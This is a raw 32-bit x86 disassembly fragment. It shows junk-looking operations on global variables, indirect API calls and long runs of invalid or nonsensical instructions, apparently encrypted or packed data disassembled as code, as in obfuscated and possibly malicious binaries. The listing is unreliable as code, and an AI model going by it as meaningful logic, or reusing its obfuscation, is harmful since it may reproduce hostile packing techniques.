  402869:	sbb    DWORD PTR ds:0x422966,ecx
  40286f:	mov    DWORD PTR [ebp-0x6c],0x1337
  402876:	mov    eax,ds:0x42294a
  40287b:	add    eax,DWORD PTR ds:0x42291e
  402881:	mov    ds:0x42294a,eax
  402886:	mov    DWORD PTR [ebp-0x70],0x7593
  40288d:	sbb    DWORD PTR ds:0x422906,edx
  402893:	mov    DWORD PTR [ebp-0x6c],0x11b8
  40289a:	mov    DWORD PTR [ebp-0x70],0x3b72
  4028a1:	mov    DWORD PTR [ebp-0x6c],0x3abc
  4028a8:	jmp    0x402e32
  4028ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4028ae:	in     eax,0x5e
  4028b0:	ficom  DWORD PTR [eax+eiz*2]
  4028b3:	adc    ch,BYTE PTR [ecx-0x57e79dc5]
  4028b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4028ba:	es scas al,BYTE PTR es:[edi]
  4028bc:	jb     0x40288c
  4028be:	in     eax,0x16
  4028c0:	push   ss
  4028c1:	cmp    eax,0x13161604
  4028c6:	pop    ds
  4028c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028c8:	fmul   QWORD PTR [ebx]
  4028ca:	inc    edx
  4028cb:	inc    ecx
  4028cc:	lahf   
  4028cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4028ce:	mov    cl,BYTE PTR [eax+0x1b3e0d01]
  4028d4:	scas   eax,DWORD PTR es:[edi]
  4028d5:	inc    edi
  4028d6:	sub    eax,0xe71a43ef
  4028db:	mov    esp,0x8825ac11
  4028e0:	ror    BYTE PTR [esi+0x21d54046],0xdb
  4028e7:	pop    ebp
  4028e8:	mov    ebx,db7
  4028eb:	dec    eax
  4028ec:	mov    WORD PTR [edi+esi*4],cs
  4028ef:	sbb    esi,DWORD PTR [edx+0x10]
  4028f2:	mov    ds,esi
  4028f4:	mov    eax,0xea3292a4
  4028f9:	sub    dl,BYTE PTR [esi]
  4028fb:	mov    WORD PTR [esi+0x6b054857],ds
  402901:	push   cs
  402902:	aas    
  402903:	out    dx,eax
  402904:	loope  0x402938
  402906:	push   esi
  402907:	loopne 0x4028aa
  402909:	cmp    BYTE PTR [edx+0x10],bl
  40290c:	cdq    
  40290d:	lea    eax,ds:0x71aaaf98
  402913:	jbe    0x40298f
  402915:	out    0x71,eax
  402917:	jae    0x40293e
  402919:	(bad)  
  40291b:	dec    ebx
  40291c:	jno    0x4028e0
  40291e:	jle    0x402983
  402920:	imul   ebp,edx
  402923:	bound  edx,QWORD PTR [edx]
  402925:	out    0xd9,al
  402927:	or     dh,cl
  402929:	stc    
  40292a:	test   BYTE PTR [esi-0x5d8b1cac],al
  402930:	(bad)  
  402931:	(bad)
  402934:	mov    bl,0x78
  402936:	fs loope 0x4029a1
  402939:	jl     0x402972
  40293b:	hlt    
  40293c:	jg     0x4028c8
  40293e:	out    0xfc,al
  402940:	retf   0x498e
  402943:	call   0xa0e3b80c
  402948:	mov    bl,0x5a
  40294a:	jns    0x4028e4
  40294c:	(bad)  
  40294d:	aad    0x1e
  40294f:	iret   
  402950:	pusha  
  402951:	and    eax,DWORD PTR [ebx+0x23]
  402954:	enter  0x71bd,0x1a
  402958:	es stc 
  40295a:	mov    al,ds:0xe71aaa9a
  40295f:	repnz sub eax,0xdd08e434
  402965:	mov    esi,0xdb836378
  40296a:	scas   eax,DWORD PTR es:[edi]
  40296b:	pop    ebp
  40296c:	dec    edi
  40296d:	lods   al,BYTE PTR ds:[esi]
  40296e:	push   ds
  40296f:	push   edi
  402970:	add    DWORD PTR [esi-0x64],eax
  402973:	or     esp,ecx
  402975:	cmp    bh,bh
  402977:	mov    ch,BYTE PTR [eax]
  402979:	pop    edi
  40297a:	inc    ebx
  40297b:	jno    0x4029d2
  40297d:	loope  0x402926
  40297f:	sahf   
  402980:	bound  edi,QWORD PTR [esi-0x3b6e9cc4]
  402986:	gs xchg bl,cl
  402989:	mov    edx,0x2561d77b
  40298e:	lock xchg edi,eax
  402990:	xchg   esi,eax
  402991:	mov    DWORD PTR [ebx+0x7c],esi
  402994:	outs   dx,DWORD PTR ds:[esi]
  402995:	dec    edx
  402996:	retf   
  402997:	sbb    al,0x31
  402999:	dec    eax
  40299a:	pop    edx
  40299b:	scas   eax,DWORD PTR es:[edi]
  40299c:	inc    edx
  40299d:	sar    DWORD PTR [esi+0x40aa7027],cl
  4029a3:	or     BYTE PTR [ebx+0x40435486],dh
  4029a9:	aam    0x4
  4029ab:	mov    dl,0x69
  4029ad:	sub    BYTE PTR cs:[esi+0x1d],al
  4029b1:	cs xchg esi,eax
  4029b3:	shl    DWORD PTR [edx+0x21],0xc3
  4029b7:	sti    
  4029b8:	test   al,0x8d
  4029ba:	xor    eax,0x9e72c649
  4029bf:	sub    DWORD PTR [edi],esi
  4029c1:	aam    0x9c
  4029c3:	mov    dh,0x8
  4029c5:	mov    esp,0x45db2fee
  4029ca:	popa   
  4029cb:	jnp    0x40296c
  4029cd:	call   0xf004a5f4
  4029d2:	cs cmp eax,esp
  4029d5:	outs   dx,BYTE PTR ds:[esi]
  4029d6:	inc    edx
  4029d7:	or     DWORD PTR [ebx+0x3c],edi
  4029da:	call   0xb36c6521
  4029df:	dec    edi
  4029e0:	shr    dh,cl
  4029e2:	repnz adc edx,DWORD PTR [ebx-0x48e28d92]
  4029e9:	add    DWORD PTR gs:[ecx+edx*1+0x477eafd],0x8633df26
  4029f5:	jecxz  0x402a3a
  4029f7:	fimul  WORD PTR [edx+0x4ddafe3e]
  4029fd:	(bad)  
  4029fe:	repnz into 
  402a00:	push   edx
  402a01:	idiv   BYTE PTR [ebx+0x346155fe]
  402a07:	sbb    edx,DWORD PTR [edi-0x5b]
  402a0a:	(bad)  
  402a0c:	imul   esi,ebp,0xffffffcd
  402a0f:	mov    ebp,0xbafde9b5
  402a14:	ret    
  402a15:	jae    0x402999
  402a17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a19:	ret    0xffb7
  402a1c:	clc    
  402a1d:	fsubr  st(2),st
  402a1f:	or     BYTE PTR [edi+0x58274509],al
  402a25:	push   eax
  402a26:	retf   
  402a27:	inc    ecx
  402a28:	add    BYTE PTR [esi-0x1d2cb55e],bh
  402a2e:	mov    DWORD PTR [edi+eiz*8+0x31cd4fd1],ebp
  402a35:	clc    
  402a36:	retf   0x7bf9
  402a39:	in     al,0x7
  402a3b:	and    al,0x80
  402a3d:	cmp    al,0x11
  402a3f:	in     al,0xe7
  402a41:	xor    eax,0xcf9aef7d
  402a46:	add    BYTE PTR [esi+0x118c1e60],ch
  402a4c:	mov    eax,ecx
  402a4e:	jbe    0x402a61
  402a50:	out    dx,al
  402a51:	pop    esp
  402a52:	pop    edi
  402a53:	sub    edi,DWORD PTR [ebx]
  402a55:	les    ecx,FWORD PTR [esi+0x76992d4a]
  402a5b:	mov    ecx,0xc9e65f3a
  402a60:	loopne 0x402ace
  402a62:	or     bh,BYTE PTR [edx]
  402a64:	enter  0x25f8,0x71
  402a68:	sub    al,0x2c
  402a6a:	sub    ebp,DWORD PTR ds:0x87c1d688
  402a70:	jnp    0x402a0f
  402a72:	out    dx,eax
  402a73:	(bad)  
  402a74:	cmp    edi,DWORD PTR [ebx-0x2db9430c]
  402a7a:	fdivr  st,st(1)
  402a7c:	pop    ds
  402a7d:	push   edx
  402a7e:	jnp    0x402a38
  402a80:	sbb    DWORD PTR [ebx+0x53],edi
  402a83:	bound  ebx,QWORD PTR [ebp+0x42eca241]
  402a89:	scas   eax,DWORD PTR es:[edi]
  402a8a:	xchg   esp,eax
  402a8b:	or     BYTE PTR [esi+0x65],ch
  402a8e:	in     eax,dx
  402a8f:	pop    edi
  402a90:	or     DWORD PTR [eax],esi
  402a92:	lods   eax,DWORD PTR ds:[esi]
  402a93:	inc    ecx
  402a94:	icebp  
  402a95:	sahf   
  402a96:	(bad)  
  402a97:	lahf   
  402a98:	cli    
  402a99:	jno    0x402a2b
  402a9b:	xor    DWORD PTR [ebp+0x5dc830cb],esi
  402aa1:	push   ds
  402aa2:	xchg   edi,eax
  402aa3:	mov    esi,0xc0a6430f
  402aa8:	test   al,0x47
  402aaa:	pop    esp
  402aab:	jno    0x402b15
  402aad:	jae    0x402a73
  402aaf:	pop    edx
  402ab0:	std    
  402ab1:	push   ecx
  402ab3:	out    0x8e,eax
  402ab5:	cld    
  402ab6:	mov    ebx,0x34e89721
  402abb:	fcompp 
  402abd:	cmp    ebx,esi
  402abf:	xchg   DWORD PTR [edx+0x3e],ebp
  402ac2:	jbe    0x402b04
  402ac4:	mov    dh,0x2f
  402ac6:	mov    dh,0x32
  402ac8:	aam    0x2a
  402aca:	rcl    DWORD PTR [edx-0x72826ad5],1
  402ad0:	sub    eax,0x46c2828e
  402ad5:	(bad)  
  402ad6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ad7:	xchg   edi,eax
  402ad8:	fwait
  402ad9:	shr    BYTE PTR [esi+0x6e],0x9b
  402add:	aaa    
  402ade:	pop    ebp
  402adf:	gs jg  0x402ac3
  402ae2:	or     dl,al
  402ae4:	mov    dh,0x9d
  402ae6:	and    dl,BYTE PTR [esi-0x44]
  402ae9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402aea:	sbb    dl,BYTE PTR [ebp+0x52]
  402aed:	data16 mov bh,0x5e
  402af0:	mov    ds:0x56b582c7,al
  402af5:	inc    esp
  402af6:	fwait
  402af7:	cmc    
  402af8:	jmp    0xcbfa:0x8e374e2b
  402aff:	mov    ebp,0x35f63e74
  402b04:	das    
  402b05:	popa   
  402b06:	xor    al,0xb3
  402b08:	stos   BYTE PTR es:[edi],al
  402b09:	pop    ecx
  402b0a:	retf   
  402b0b:	mov    ecx,0x300ff9e8
  402b10:	rcl    eax,cl
  402b12:	loop   0x402abf
  402b14:	lea    edx,[esi]
  402b16:	push   eax
  402b17:	sub    al,BYTE PTR ds:0x64c6e5c6
  402b1d:	sub    DWORD PTR [edi],esi
  402b1f:	mov    ds:0x8e077e60,al
  402b24:	jmp    0x402b10
  402b26:	rcl    edx,1
  402b28:	cmp    DWORD PTR [ebp+0x26197243],edi
  402b2e:	xor    eax,0x2be2c28a
  402b33:	sub    DWORD PTR [edx-0x216bcaef],0x7cff287
  402b3d:	pop    esp
  402b3e:	jno    0x402b04
  402b40:	or     eax,0xcc2e2446
  402b45:	inc    ecx
  402b46:	ror    BYTE PTR [esi+edx*1-0x604e7e02],cl
  402b4d:	mov    ds:0x8955ccd9,eax
  402b52:	pop    edx
  402b53:	push   esi
  402b54:	retf   
  402b55:	sub    al,0x8e
  402b57:	mov    al,ds:0xa0c2e17d
  402b5c:	cli    
  402b5d:	mov    ch,0xcb
  402b5f:	fisttp WORD PTR [edi-0x54]
  402b62:	in     eax,0xa0
  402b64:	cmp    edx,DWORD PTR [eax-0x4b]
  402b67:	push   es
  402b68:	mov    bh,0x5b
  402b6a:	push   eax
  402b6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b6c:	call   0x26c9cf98
  402b71:	rol    BYTE PTR [ecx+0x459437b7],cl
  402b77:	pop    ebp
  402b78:	test   al,0xd0
  402b7a:	sbb    eax,0xda82d02e
  402b7f:	mov    ch,0xf0
  402b81:	mov    cl,0x3e
  402b83:	cmp    DWORD PTR [edi],ecx
  402b85:	mov    ch,0x30
  402b87:	xor    eax,edx
  402b89:	out    0x6b,al
  402b8b:	sub    DWORD PTR [edi-0x9],0x655ec145
  402b92:	add    esp,DWORD PTR [esi+eiz*4]
  402b95:	fwait
  402b96:	icebp  
  402b97:	lea    eax,[ecx-0x110d9039]
  402b9d:	jnp    0x402b7d
  402b9f:	xchg   edi,eax
  402ba0:	(bad)  
  402ba1:	cmp    eax,0x4e98e2b4
  402ba6:	jae    0x402c07
  402ba8:	in     eax,dx
  402ba9:	push   ebp
  402baa:	sub    al,0x6b
  402bac:	aas    
  402bad:	mov    BYTE PTR [ecx+0x46f523ba],al
  402bb3:	inc    eax
  402bb4:	jo     0x402be6
  402bb6:	ja     0x402c0c
  402bb8:	jnp    0x402b88
  402bba:	jno    0x402ba1
  402bbc:	sub    BYTE PTR [eax+0x74],ch
  402bbf:	and    al,BYTE PTR [ebx]
  402bc1:	dec    eax
  402bc2:	cmp    BYTE PTR [edx-0x11],bl
  402bc5:	jmp    0x402b6e
  402bc7:	pop    ecx
  402bc8:	js     0x402bf3
  402bca:	mov    esi,0x437153b3
  402bcf:	adc    DWORD PTR [ecx-0x14],ebx
  402bd2:	leave  
  402bd3:	push   edi
  402bd4:	mov    BYTE PTR [edx+0x12],0x62
  402bd8:	pop    esi
  402bd9:	mov    ecx,0x6fbc3b8c
  402bde:	dec    esp
  402bdf:	push   ebx
  402be0:	mov    bh,0xa
  402be2:	mov    edx,0xacdb782
  402be7:	jbe    0x402c04
  402be9:	cmp    ch,BYTE PTR [ebx+0x28]
  402bec:	enter  0xf830,0xc5
  402bf0:	mov    esi,0x2aef10ab
  402bf5:	scas   al,BYTE PTR es:[edi]
  402bf6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402bf7:	sbb    ch,BYTE PTR [edx+ebp*8+0x6b1b52b0]
  402bfe:	pop    edx
  402bff:	add    eax,0xe08af5a8
  402c04:	mov    bl,0x71
  402c06:	cmp    ah,al
  402c08:	xchg   esi,ebp
  402c0a:	scas   al,BYTE PTR es:[edi]
  402c0b:	test   al,0x6b
  402c0d:	sbb    eax,0x8957c3c0
  402c12:	add    eax,0x2afa4b29
  402c17:	xchg   DWORD PTR [eax+ebp*2+0x2c],eax
  402c1b:	dec    ebx
  402c1c:	mov    eax,0x79131a51
  402c21:	xchg   ecx,eax
  402c22:	xchg   edi,eax
  402c23:	cwde   
  402c24:	inc    ebx
  402c25:	imul   eax,DWORD PTR [edi],0xd545e49b
  402c2b:	cmp    DWORD PTR [ebx+0x75],ebx
  402c2e:	(bad)  
  402c2f:	xor    BYTE PTR [edi+0x42479dc8],ch
  402c35:	mov    dl,0xd9
  402c37:	lds    edx,FWORD PTR [esi-0x47b6503]
  402c3d:	cmp    eax,0xea9b024
  402c43:	mov    ds:0x210e84dc,eax
  402c48:	js     0x402ca1
  402c4a:	inc    ebp
  402c4b:	stos   BYTE PTR es:[edi],al
  402c4c:	jmp    0x37ac:0xb0975f42
  402c53:	sahf   
  402c54:	push   0xdb4108cb
  402c59:	lea    edi,[edx]
  402c5b:	mov    edi,0xf262d3b4
  402c60:	mov    bl,0x65
  402c62:	mov    al,ds:0x7b9570da
  402c67:	push   ss
  402c68:	js     0x402c4b
  402c6a:	inc    ebx
  402c6b:	sbb    al,0x7f
  402c6d:	es xor dh,ah
  402c70:	xchg   edx,eax
  402c71:	lahf   
  402c72:	in     al,0xcb
  402c74:	xchg   DWORD PTR [eax+eax*8+0x18897def],edx
  402c7b:	xchg   BYTE PTR [ecx+esi*8+0x7940d258],cl
  402c82:	pusha  
  402c83:	leave  
  402c84:	mov    ds:0xd936191e,eax
  402c89:	iret   
  402c8a:	adc    esp,DWORD PTR [edi-0x3b73b45d]
  402c90:	add    ah,BYTE PTR [eax-0x5d]
  402c93:	pop    ss
  402c94:	into   
  402c95:	jge    0x402c9b
  402c97:	ins    DWORD PTR es:[edi],dx
  402c98:	outs   dx,BYTE PTR ds:[esi]
  402c99:	call   0xe55c:0xa1e540d
  402ca0:	pop    ebx
  402ca1:	sub    dh,ch
  402ca3:	pop    ebx
  402ca4:	mov    dh,0x90
  402ca6:	or     eax,0x5a4930
  402cab:	aam    0x3b
  402cad:	jnp    0x402d03
  402caf:	mov    ebx,0x423bb12c
  402cb4:	and    BYTE PTR [ebx-0x75],0x65
  402cb8:	push   0xbdfe1d35
  402cbd:	fld1   
  402cbf:	mov    esi,0x4d847bf3
  402cc4:	retf   0x9907
  402cc7:	repnz add al,0x48
  402cca:	xchg   ebx,eax
  402ccb:	mov    ecx,DWORD PTR [esi-0x25]
  402cce:	das    
  402ccf:	pop    ecx
  402cd0:	or     edx,eax
  402cd2:	adc    DWORD PTR [eax-0x702c8bee],edi
  402cd8:	scas   al,BYTE PTR es:[edi]
  402cd9:	xor    ah,BYTE PTR [esi-0xa382d01]
  402cdf:	pop    esp
  402ce0:	push   es
  402ce1:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ce3:	jno    0x402c72
  402ce5:	jo     0x402c99
  402ce7:	adc    al,0x6f
  402ce9:	les    esi,FWORD PTR [eax+0x6ab23a35]
  402cef:	hlt    
  402cf0:	in     eax,0x61
  402cf2:	popf   
  402cf3:	adc    dl,0x5
  402cf6:	xchg   ecx,eax
  402cf7:	dec    ebx
  402cf8:	shr    DWORD PTR [edi+0x3b8cfe29],0x8d
  402cff:	aam    0xc
  402d01:	pop    ebp
  402d02:	xor    ch,bl
  402d04:	mov    BYTE PTR [eax-0x23],0x26
  402d08:	or     DWORD PTR ds:0x73f225f1,0x870ab33a
  402d12:	stc    
  402d13:	pushf  
  402d14:	pushf  
  402d15:	push   eax
  402d16:	xchg   esi,eax
  402d17:	mov    ah,0xc2
  402d19:	jecxz  0x402d39
  402d1b:	in     eax,dx
  402d1c:	hlt    
  402d1d:	fmul   DWORD PTR [esi]
  402d1f:	push   0x37
  402d21:	shr    BYTE PTR [edx],0xc4
  402d24:	outs   dx,DWORD PTR ds:[esi]
  402d25:	mov    bh,0x80
  402d27:	cdq    
  402d28:	mov    ch,0x2
  402d2a:	pop    sp
  402d2c:	iret   
  402d2d:	push   cs
  402d2e:	pop    eax
  402d2f:	ins    DWORD PTR es:[edi],dx
  402d30:	push   eax
  402d31:	iret   
  402d32:	lds    edx,FWORD PTR [ebx-0x59f9d207]
  402d38:	div    DWORD PTR [ebx-0x522603cd]
  402d3e:	or     eax,DWORD PTR [eax]
  402d40:	mov    eax,0xacb7d243
  402d46:	adc    ecx,DWORD PTR [eax]
  402d48:	jae    0x402d34
  402d4a:	shr    BYTE PTR [edx-0x676d4e98],1
  402d50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d51:	leave  
  402d52:	int    0x4f
  402d54:	in     eax,dx
  402d55:	(bad)  
  402d56:	(bad)  
  402d57:	xor    DWORD PTR [ebp-0x6bcecf4e],ecx
  402d5d:	aad    0x46
  402d5f:	lahf   
  402d60:	xchg   esi,eax
  402d61:	adc    eax,0x7d935790
  402d66:	push   esp
  402d67:	outs   dx,BYTE PTR ds:[esi]
  402d68:	(bad)  
  402d6a:	outs   dx,DWORD PTR ds:[esi]
  402d6b:	out    0x26,al
  402d6d:	std    
  402d6e:	pop    es
  402d6f:	(bad)  
  402d70:	das    
  402d71:	popa   
  402d72:	jnp    0x402d07
  402d74:	xchg   edi,eax
  402d75:	push   ebx
  402d76:	data16 daa 
  402d78:	aam    0x43
  402d7a:	pop    ss
  402d7b:	mov    ?,ebx
  402d7d:	cdq    
  402d7e:	cmp    ebx,DWORD PTR [ebp+0x15]
  402d81:	and    BYTE PTR [ecx-0x4208eb12],dh
  402d87:	mov    eax,ds:0x23477c65
  402d8c:	pop    edi
  402d8d:	mov    ch,0x75
  402d8f:	popa   
  402d90:	int    0x40
  402d92:	mov    bl,0x1b
  402d94:	(bad)  
  402d95:	cmp    eax,0xfa43e02b
  402d9a:	in     eax,0x28
  402d9c:	cmp    eax,0x58ece52c
  402da1:	push   edi
  402da2:	pop    ebx
  402da3:	jno    0x402e13
  402da5:	push   edi
  402da6:	cmp    eax,0xa03b90de
  402dab:	fiadd  DWORD PTR ss:[ebx]
  402dae:	mov    cl,0x35
  402db0:	mov    cl,0x97
  402db2:	sub    eax,0xe8572c0d
  402db7:	gs (bad) 
  402db9:	shr    DWORD PTR [ebp-0x1d],cl
  402dbc:	out    0x3d,al
  402dbe:	jmp    0xb51dea43
  402dc3:	and    eax,0x48a6710f
  402dc8:	aam    0x8b
  402dca:	stos   DWORD PTR es:[edi],eax
  402dcb:	mov    edx,0xf81b3cb
  402dd0:	aad    0xa4
  402dd2:	push   ds
  402dd3:	hlt    
  402dd4:	iret   
  402dd5:	leave  
  402dd6:	push   edx
  402dd7:	pop    ebp
  402dd8:	cmp    DWORD PTR ds:0x1f25a7e0,ebx
  402dde:	test   eax,0xcdb36561
  402de3:	scas   al,BYTE PTR es:[edi]
  402de4:	cmp    ah,BYTE PTR [edi+edx*2-0x7a]
  402de8:	push   ecx
  402de9:	jno    0x402db8
  402deb:	imul   eax,DWORD PTR ss:[ebx],0x26b0928f
  402df2:	dec    ebp
  402df3:	nop
  402df4:	xchg   esi,eax
  402df5:	and    esi,DWORD PTR [eax]
  402df7:	mov    dh,0x71
  402df9:	cmp    eax,0x28b227a7
  402dfe:	xchg   ebx,eax
  402dff:	mov    ecx,0xbc7498b3
  402e04:	jecxz  0x402dd8
  402e06:	out    dx,al
  402e07:	xchg   edx,eax
  402e08:	ror    DWORD PTR [ebp+0x656e30b7],cl
  402e0e:	push   esi
  402e0f:	push   ebx
  402e10:	gs push ebp
  402e12:	fs adc al,0xc9
  402e15:	cmp    DWORD PTR [ecx-0x65],eax
  402e18:	adc    al,0xd5
  402e1a:	cld    
  402e1b:	mov    gs,WORD PTR [eax-0x2fbe9f13]
  402e21:	fidiv  DWORD PTR [ecx]
  402e23:	pop    edx
  402e24:	add    eax,0xa612c085
  402e29:	das    
  402e2a:	(bad)  
  402e2b:	imul   edx,DWORD PTR [edx+ecx*8],0xffffffe1
  402e2f:	fadd   DWORD PTR [edi]
  402e31:	mov    ebx,0x459845c7
  402e36:	sbb    eax,DWORD PTR [eax]
  402e38:	add    bh,al
  402e3a:	add    eax,0x42299e
  402e3f:	sbb    BYTE PTR [edi],al
  402e41:	add    BYTE PTR [eax],al
  402e43:	mov    DWORD PTR [ebp-0x64],0x767d
  402e4a:	cmp    DWORD PTR ds:0x42295a,0x0
  402e51:	mov    DWORD PTR ds:0x4229ba,0x78de
  402e5b:	mov    DWORD PTR ds:0x422976,0x1706
  402e65:	jmp    0x402ecb
  402e6a:	mov    DWORD PTR ds:0x4228ca,0x464
  402e74:	not    eax
  402e76:	jne    0x402ea1
  402e7c:	push   0x8a0f
  402e81:	call   DWORD PTR ds:0x42a28c
  402e87:	add    DWORD PTR ds:0x422982,ecx
  402e8d:	add    DWORD PTR ds:0x422912,0x4228d6
  402e97:	add    DWORD PTR ds:0x42291a,0x3216
  402ea1:	sub    DWORD PTR ds:0x4229be,0x591
  402eab:	adc    DWORD PTR ds:0x4228f2,0x4409
  402eb5:	add    DWORD PTR ds:0x4228fe,ebx
  402ebb:	add    DWORD PTR ds:0x4229ae,0x46bd
  402ec5:	sub    DWORD PTR ds:0x422936,ecx
  402ecb:	mov    DWORD PTR [ebp-0x60],0x1d973857
  402ed2:	mov    DWORD PTR ds:0x42294a,0xbf3
  402edc:	mov    DWORD PTR [ebp-0x5c],0x0
  402ee3:	mov    DWORD PTR [ebp-0x34],0x599d
  402eea:	add    DWORD PTR ds:0x4228fa,edi
  402ef0:	mov    DWORD PTR [ebp-0x2c],0x165d
  402ef7:	movzx  eax,WORD PTR ds:0x4228a2
  402efe:	and    DWORD PTR ds:0x4229ae,eax
  402f04:	mov    DWORD PTR [ebp-0x1c],0xc51
  402f0b:	xor    eax,0x7ef6
  402f10:	mov    DWORD PTR [ebp-0x44],0x3f55
  402f17:	inc    eax
  402f18:	mov    DWORD PTR [ebp-0x44],0x1
  402f1f:	mov    DWORD PTR [ebp-0x44],0x42e8
  402f26:	cmp    DWORD PTR ds:0x4228a6,0x0
  402f2d:	mov    DWORD PTR ds:0x422926,ebx
  402f33:	mov    DWORD PTR ds:0x42296e,0x475b
  402f3d:	jmp    0x403081
  402f42:	mov    DWORD PTR ds:0x4228fa,0x2105
  402f4c:	not    eax
  402f4e:	jne    0x402f83
  402f54:	push   0x132b
  402f59:	push   DWORD PTR [ebp-0x14]
  402f5c:	push   DWORD PTR [ebp-0x10]
  402f5f:	call   DWORD PTR ds:0x42a290
  402f65:	xor    DWORD PTR ds:0x422932,0x9bb
  402f6f:	or     DWORD PTR ds:0x422996,0x4228ea
  402f79:	and    DWORD PTR ds:0x422932,0x4229ce
  402f83:	and    DWORD PTR ds:0x4229ce,edi
  402f89:	add    DWORD PTR ds:0x4228e6,0x4228da
  402f93:	dec    DWORD PTR ds:0x4229b2
  402f99:	xor    DWORD PTR ds:0x4228ee,ecx
  402f9f:	cmp    DWORD PTR ds:0x422996,0x0
  402fa6:	mov    DWORD PTR ds:0x4228e6,0xf94
  402fb0:	mov    DWORD PTR ds:0x4228de,0x6d8f
  402fba:	mov    DWORD PTR ds:0x42291e,0x78af
  402fc4:	jmp    0x403081
  402fc9:	mov    DWORD PTR ds:0x42290e,ebx
  402fcf:	mov    DWORD PTR ds:0x4228fe,0x3885
  402fd9:	jge    0x402ffe
  402fdf:	push   0x3dec
  402fe4:	call   DWORD PTR ds:0x42a044
  402fea:	add    DWORD PTR ds:0x42298e,0x4228ba
  402ff4:	sub    DWORD PTR ds:0x422916,0x422996
  402ffe:	add    DWORD PTR ds:0x42294e,0x308f
  403008:	sub    DWORD PTR ds:0x42299a,ebx
  40300e:	or     DWORD PTR ds:0x4228e2,0x4229ce
  403018:	and    DWORD PTR ds:0x422996,0x422972
  403022:	cmp    DWORD PTR ds:0x4228be,0x0
  403029:	mov    DWORD PTR ds:0x422896,0x7e8b
  403033:	mov    DWORD PTR ds:0x4228d2,0x6e2b
  40303d:	jmp    0x403081
  403042:	mov    eax,ds:0x42294e
  403047:	mov    DWORD PTR ds:0x422912,0x27c8
  403051:	jl     0x403071
  403057:	call   DWORD PTR ds:0x42a294
  40305d:	xor    DWORD PTR ds:0x4228f6,0x34a0
  403067:	and    DWORD PTR ds:0x42299e,0x4228c2
  403071:	or     DWORD PTR ds:0x4229b2,0x422916
  40307b:	xor    DWORD PTR ds:0x422892,ecx
  403081:	mov    eax,DWORD PTR [ebp-0x60]
  403084:	shl    ecx,0x1e
  403087:	mov    ecx,DWORD PTR [ebp-0x5c]
  40308a:	and    DWORD PTR ds:0x422912,0x10bb
  403094:	push   ecx
  403095:	inc    DWORD PTR ds:0x42298e
  40309b:	push   eax
  40309c:	push   0xddf
  4030a1:	push   0x2d0f
  4030a6:	add    DWORD PTR ds:0x4228d6,0x562b
  4030b0:	call   0x421af3
  4030b5:	mov    ecx,DWORD PTR [ebp-0x68]
  4030b8:	add    DWORD PTR ds:0x4228e6,0x12e8
  4030c2:	mov    edx,DWORD PTR [ebp-0x64]
  4030c5:	sub    DWORD PTR ds:0x42290e,0x5673
  4030cf:	xor    eax,ecx
  4030d1:	not    ecx
  4030d3:	mov    ecx,DWORD PTR [ebp-0x70]
  4030d6:	add    edx,0x725d
  4030dc:	mov    edx,DWORD PTR [ebp-0x6c]
  4030df:	sub    edx,DWORD PTR ds:0x4228f2
  4030e5:	sub    eax,ecx
  4030e7:	cmp    DWORD PTR ds:0x4228c2,0x0
  4030ee:	mov    DWORD PTR ds:0x42295a,0x2680
  4030f8:	mov    edx,0xd63
  4030fd:	movzx  edx,BYTE PTR ds:0x4229ce
  403104:	mov    DWORD PTR ds:0x4228b6,ecx
  40310a:	jmp    0x403179
  40310f:	mov    DWORD PTR ds:0x4228f2,0x12c1
  403119:	mov    DWORD PTR ds:0x4228d2,ecx
  40311f:	jl     0x403160
  403125:	push   0x234a
  40312a:	push   0x7349
  40312f:	push   DWORD PTR [ebp-0x28]
  403132:	call   DWORD PTR ds:0x42a00c
  403138:	xor    edx,edx
  40313a:	or     edx,DWORD PTR ds:0x4229fe
  403140:	mov    edx,DWORD PTR [edx]
  403142:	sbb    DWORD PTR ds:0x4229ca,edx
  403148:	sbb    edx,DWORD PTR ds:0x42294a
  40314e:	mov    edx,DWORD PTR ds:0x42293e
  403154:	add    edx,DWORD PTR ds:0x42290e
  40315a:	mov    DWORD PTR ds:0x42293e,edx
  403160:	sbb    edx,0x27b8
  403166:	movzx  edx,BYTE PTR ds:0x422902
  40316d:	or     edx,DWORD PTR ds:0x422912
  403173:	mov    DWORD PTR ds:0x422902,edx
  403179:	mov    ecx,DWORD PTR ds:0x422298
  40317f:	mov    edx,DWORD PTR ds:0x4229ee
  403185:	mov    edx,DWORD PTR [edx]
  403187:	xor    DWORD PTR ds:0x4228be,edx
  40318d:	lea    eax,[eax+ecx*1-0x27d2]
  403194:	jmp    0x40371e
  403199:	out    0x30,al
  40319b:	dec    BYTE PTR [edi+0x18661839]
  4031a1:	lock push 0x4b3872b2
  4031a7:	sbb    al,0x74
  4031a9:	hlt    
  4031aa:	loope  0x4031c2
  4031ac:	push   ss
  4031ad:	cmp    eax,0xcb161604
  4031b2:	in     eax,0x10
  4031b4:	out    dx,eax
  4031b5:	pop    ebx
  4031b6:	mov    bh,0x6d
  4031b8:	pop    esp
  4031b9:	jb     0x4031d3
  4031bb:	push   0x48
  4031bd:	adc    eax,0xc562ff4c
  4031c2:	fdivr  QWORD PTR [esi]
  4031c4:	je     0x403229
  4031c6:	shl    BYTE PTR [ebp-0x2b8855ec],cl
  4031cc:	ja     0x4031e2
  4031ce:	or     bl,bl
  4031d0:	mov    eax,esi
  4031d2:	rcl    BYTE PTR [esi-0x2a],cl
  4031d5:	jbe    0x403220
  4031d7:	fwait
  4031d8:	and    al,0xe9
  4031da:	loop   0x40322b
  4031dc:	mov    al,BYTE PTR [edx+esi*4-0x71]
  4031e0:	push   esi
  4031e1:	gs sub al,0xfd
  4031e4:	(bad)  
  4031e5:	mov    esi,0xe0ebd235
  4031ea:	sub    BYTE PTR [ebx+0xe],ch
  4031ed:	adc    eax,0x702ab0c1
  4031f2:	ss popa 
  4031f4:	adc    al,0xb4
